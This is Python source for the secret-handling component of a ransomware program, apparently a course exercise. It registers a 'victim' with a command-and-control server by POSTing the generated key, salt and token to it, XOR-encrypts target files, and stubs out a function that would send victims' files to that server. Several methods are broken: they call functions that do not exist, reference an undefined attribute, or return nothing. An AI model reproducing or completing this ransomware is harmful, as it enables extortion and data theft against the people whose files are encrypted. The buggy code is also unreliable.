from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        derived_key = kdf.derive(key)

        return derived_key

    def create(self) -> Tuple[bytes, bytes, bytes]:
        token = secrets.token_bytes(self.TOKEN_LENGTH)
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)

        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        # Register the victim to the CNC
        URL = f"http://{self._remote_host_port}/new"  # Create the URL

        # Create a dictionary containing the data to send in base64
        DATA = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
        }

        # Send the request
        R = requests.post(URL, json=DATA)

        # Log the request information
        self._log.info(f"POST {URL} {DATA} {R.status_code}")

        # Check the status of the request
        if R.status_code != 200:
            self._log.error(f"Failed to send: {R.text}")
        else:
            self._log.info("Successfully sent")   

    def setup(self)->None:
         # Generate the cryptographic components: salt, key, and token
        self._salt, self._key, self._token = self.create()

        # Create the storage directory for cryptographic data
        os.makedirs(self._path, exist_ok=True)

        # Save the cryptographic data in local files
        with open(os.path.join(self._path, "salt_data.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "token_data.bin"), "wb") as token_file:
            token_file.write(self._token)
        
        # Send the cryptographic data to the CNC server
        self.post_new(self._salt, self._key, self._token)

    def load_crypto_data(self) -> None:
        # Function to load encryption data
        # Loading encryption data
        salt_file_path = os.path.join(self._path, "salt_data.bin")
        token_file_path = os.path.join(self._path, "token_data.bin")

        # Check for the existence of encryption data files
        if os.path.exists(salt_file_path) and os.path.exists(token_file_path):
            # Load encryption data
            with open(salt_file_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_file_path, "rb") as token_f:
                self._token = token_f.read()
        else:
            self._log.info("Encryption data does not exist")


    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        # Generate the token using the salt and the candidate_key
        generated_token = self.perform_derivation(self._salt, candidate_key)
        return generated_token == self._token

    def set_key(self, b64_key:str)->None:
        candidate_key = base64.b64decode(b64_key)

        if self.verify_key(candidate_key):
            self._key = candidate_key
            self._log.info("Key successfully set")
        else:
            self._log.error("Invalid key provided")
            raise ValueError("Invalid key")

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        with open(os.path.join(self._path, "token.bin"), "rb") as f:
            TOKEN = f.read()

    def xorfiles(self, files:List[str])->None:
        # xor a list for fi
        for file in files:
            self._files_encrypted[str(file)] = xorfile(file, self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        self._key = secrets.token_bytes(SecretManager.KEY_LENGTH)
        self._key = None
        self._salt = secrets.token_bytes(SecretManager.SALT_LENGTH)
        self._salt = None
        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH)
        self._token = None


